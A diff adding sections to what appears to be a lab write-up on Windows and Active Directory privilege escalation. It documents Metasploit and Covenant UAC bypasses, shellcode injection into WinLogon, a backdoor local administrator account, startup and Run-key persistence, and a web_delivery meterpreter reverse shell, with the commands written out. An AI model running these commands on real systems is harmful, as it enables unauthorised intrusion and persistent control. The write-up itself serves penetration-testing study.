@@ -423,18 +423,235 @@ The AlwaysInstallElevated registry setting is a critical component for privilege
 
 This process demonstrated how the AlwaysInstallElevated setting could be exploited to gain elevated privileges on a target system.
 
+# AlwaysInstallElevated Misconfiguration with Metasploit
+
+In this segment, I explored how the AlwaysInstallElevated misconfiguration can be leveraged using Metasploit to gain elevated privileges on a target system.
+
+### Using the Web Delivery Module in Metasploit
+- Utilized Metasploit's web delivery module to generate a PowerShell script. This script was then executed in PowerShell on Workstation 01 to establish the initial shell.
+- 
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/2d07d1e8-1c15-4073-a644-bd17f77f1e86)
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/867f9b59-761e-49a9-909e-62da07664a9e)
+
+- Conducted checks for different service versions and potential patches.
+- Identified numerous exploits that could be used to elevate privileges to the root user level.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/32c2f294-9ba3-4408-bbe3-8e30b779cf70)
 
 
+### Managing Sessions in Metasploit
+- Used Ctrl+Z to background the session in Metasploit (msf6).
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/be1ebc01-ae8f-47a5-9ede-a40d04b41e90)
+
+- Created and subsequently deleted a session to manage the Metasploit workflow effectively.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0e123e5b-8c00-40ea-98b0-1ac9232cb5dd)
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/57d00c69-4b65-43b8-acae-4a694a88ae7b)
+
+### Targeting Specific Sessions
+- Searched for specific sessions, particularly session 1, which is critical for further exploitation steps.
+- Identified a session for WinLogon which is crucial for migration.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/97d59daa-944a-4a37-9ae8-5d0fac06a9cd)
+
+- Successfully migrated to process 580 and monitored the progress on the workstation using `sysinfo`.
+
+This exercise provided practical insights into leveraging Metasploit for exploiting misconfigurations and achieving privilege escalation on Windows systems.
 
 
+# FodHelper UAC Bypass with Covenant
+
+Leveraging the User Access Control (UAC) functionality in Windows, I escalated privileges from medium integrity of the `s.chisholm` account to high integrity, and ultimately gained system user access on Workstation 01.
+
+### Utilizing FodHelper
+- FodHelper, a trusted Windows binary, was used for the UAC bypass.
+- In the Covenant blue screen interface, I used `PowerShellImport` to bring in necessary scripts.
+- Located the `helper.ps1` file in the custom Kali build directory and executed a custom PowerShell command:
+
+powershell helper -custom "cmd.exe /c powershell -Sta -Nop -Window Hidden -EncodedCommand [PowerShell Launcher Script]
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/46cbdf3a-509a-4f02-b585-1a365b3b3e03)
+
+- Checked for elevated privileges using the `ps` command in the blue interface:
+  
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/95615018-0454-4d58-bc28-96f24e3051ef)
+
+### Injecting ShellCode with Covenant
+- Accessed `Covenant > Launchers > ShellCode` to prepare for injection.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e06e5beb-5175-4f26-9db2-48b9e49b5cd1)
+
+- Downloaded and saved the ShellCode.
+- Returned to the blue screen interface and typed `inject`.
+- Entered the WinLogon process ID `580` in the prompt window to target the specific process.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/3f17f4e9-ebba-4f1c-9966-78cee329ec5c)
+
+- Located the ShellCode on the desktop, executed it, and successfully injected it into the WinLogon process, showcasing its potential in penetration testing scenarios.
+  
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/d1416518-4eb1-4308-be14-670cd903868e)
+
+# UAC Bypass with Metasploit 
+
+Aiming to elevate privileges as `s.chisholm` and migrate from a session 0 process to a session 1 process for full machine control.
+
+### Metasploit Configuration and Execution
+- Started with the exploit `windows/local/bypassuac_dotnet_profiler` in Metasploit.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a8edb5f2-d5fe-431a-90c1-ae038ae9507a)
 
 
+- Identified potential exploits to achieve UAC bypass:
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/47b4e78e-0120-47e0-9d65-824d3692d899)
+
+- Set the session and executed the exploit:
+
+msf6 exploit(windows/local/bypassuac_dotnet_profiler) > set session 1
+msf6 exploit(windows/local/bypassuac_dotnet_profiler) > exploit -j
+msf6 exploit(windows/local/bypassuac_dotnet_profiler) > sessions
+
+- Further elevated privileges and interacted with session 4:
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/851b5432-da0c-4b51-9baf-e405f94a9b94)
+
+msf6 exploit(windows/local/bypassuac_dotnet_profiler) > sessions -i 4
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/d2a90b64-1908-4d5c-890d-ff42faa9d03f)
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a05d0a00-4c5d-4709-aca2-a79daa8a96b9)
+
+- Migrated to process 580 and verified the user ID:
+meterpreter > migrate 580
+meterpreter > getuid
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/9a452dd2-1fef-4501-8a34-edfdea5d2640)
+
+These steps demonstrated the effectiveness of UAC bypass techniques in both Covenant and Metasploit for achieving higher privileges on a target system.
+
+# New User Persistence 
+
+Creating a new user is a fundamental technique for ensuring domain persistence on a workstation. This involves interacting with accounts that have local administrative privileges.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/b4ead94c-1238-46e6-b3b5-518502314104)
 
 
+### Creating a New User
+- In the blue screen interface of Covenant, used the following command to add a new user:
+shellcmd net users hacker Password123! /add
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a802a9cc-f5a5-4548-a1c1-3e560755a672)
+
+- Verified the list of users to confirm the addition:
+shell net users
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/eec8e95c-e4fb-4346-acfe-48f5f1cb70fb)
+
+### Adding User to Local Administrator Group
+- Added the newly created user to the local administrator group for elevated privileges:
+shell net localgroup administrators hacker /add
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/2d921ce6-a07e-4034-bbb3-2021b99821d7)
 
 
+# Startup Persistence
 
+Leveraging the Startup vulnerability in Windows to create a persistence technique that calls back to us every time the victim machine is started and logged into.
 
+### Implementing Startup Persistence
+- Utilized the high integrity grunt in Covenant to inject a payload into startup tasks.
+- Navigated to the Task tab and selected `PersistStartup`.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/b53a15b0-57ea-42ec-be9b-a2ee0f5c4596)
+
+- Executed the task to load Covenant into the startup menu.
+- 
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/17185032-6c83-4683-bd27-76f12020244c)
+
+- Observed that upon logging in as `s.chisholm` on Workstation 1, Covenant appeared in the Task Manager's startup list.
+- 
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0f53ca50-23d3-497a-b2a2-8ea0c29fb41c)
+
+- Noted the ability to disable and remove Covenant from the startup file directory as needed.
+
+# Autorun Persistence
+
+Using Covenant's Autorun Persistence technique to create a registry edit, ensuring a payload runs on Workstation 01 every time it restarts.
+
+### Setting Up Autorun Persistence
+- Interacted with the high integrity grunt and went to Launchers in Covenant.
+- Configured a binary launcher with DotNetVersion set to Net40 and generated a payload.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/35ec7834-7b6d-4f14-94b3-1952b2e0fff7)
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/d0f71815-74e8-464c-a537-d2415513e11a)
+
+### Implementing Autorun Registry Edit
+- Uploaded the payload before creating the Autorun task.
+- Accessed the Covenant blue interface screen to manage the task.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/31400c14-f433-47b7-b3fe-f8aec7036c43)
+
+- Created a new registry edit in `Computer/HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/8de56c7e-208d-41ed-b2ff-0df7e013c92d)
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/305c46ba-e82a-47f3-893f-b770e114543b)
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/717b9ac9-fac1-4991-80b3-790ff07a7f88)
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4147915b-66e5-4097-87a3-255f1c369fa4)
+
+- Confirmed the creation of the new registry key labeled "Updater".
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/635db464-1df4-4c9a-a58e-eb89f50e321d)
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4928f0c0-92bf-4fa2-b837-87bd70c04a73)
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e7149562-51d5-4997-afef-f2779fb1417b)
+
+- Restarted Workstation 01 and logged back in as `s.chisholm` to validate the persistence.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/f5114c04-e5b6-4890-871e-bca40c7159a8)
+
+This process showcased the effective use of Covenant for creating persistent access on a target machine through various techniques.
+
+# Session Passing to Metasploit, SOCKS, and the Autoroute Module
+
+In this phase, I focused on advanced networking techniques involving port forwarding, proxying through SOCKS, session passing, and autorouting, using both Covenant and Metasploit.
+
+### Integrating Covenant with Metasploit
+- Utilized session passing from Covenant to Metasploit due to Covenant's lack of native SOCKS functionality.
+- Aimed to generate a route for the victim machine (Workstation 01) and set up port forwarding to redirect traffic to the Covenant machine.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/80a43967-cd9e-44e5-a6c6-af9a0b81e3b4)
+
+### Generating Shellcode Payload in Metasploit
+- Generated a shellcode payload in Metasploit for a reverse shell on Workstation 01.
+- Searched for "web_delivery" in Metasploit to find the suitable module.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a1dd2738-295d-4ead-8b07-f60a52260196)
+
+`msf5 > use 1`
+`msf5 > exploit(multi/script/web_delivery) > set target 2`
+`msf5 > exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_http`
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/7ad95577-8672-4675-9290-6d2b9a93e834)
+
+`msf5 > exploit(multi/script/web_delivery) > options`
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/34de4f18-89c1-4473-a56b-da4f21e6ab35)
+
+  `msf5 > exploit(multi/script/web_delivery) > set lhost eth0`
+  `msf5 > exploit(multi/script/web_delivery) > set lport 8081`
+  `msf5 > exploit(multi/script/web_delivery) > exploit -j`
+  
+- Executed the exploit and copied the generated payload.
+
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/1058a7e7-b444-4546-85cd-01877e469fdc)
+
+`msf5 > exploit(multi/script/web_delivery) > exploit -j`
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/16e9943a-1508-441c-a73f-06e8465515a3)
+
+Now copy this payload.
+- Go back over to the covenant session:
+- Blue screen interface.
+- Paste the payload and then hit "Enter"
+   `msf5 > exploit(multi/script/web_delivery) > sessions`
+![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/f4dd4192-4eea-4170-81c7-770bd0764d4f)
+
+TBC
 
 ## Privilege Escalation and Security Testing
 
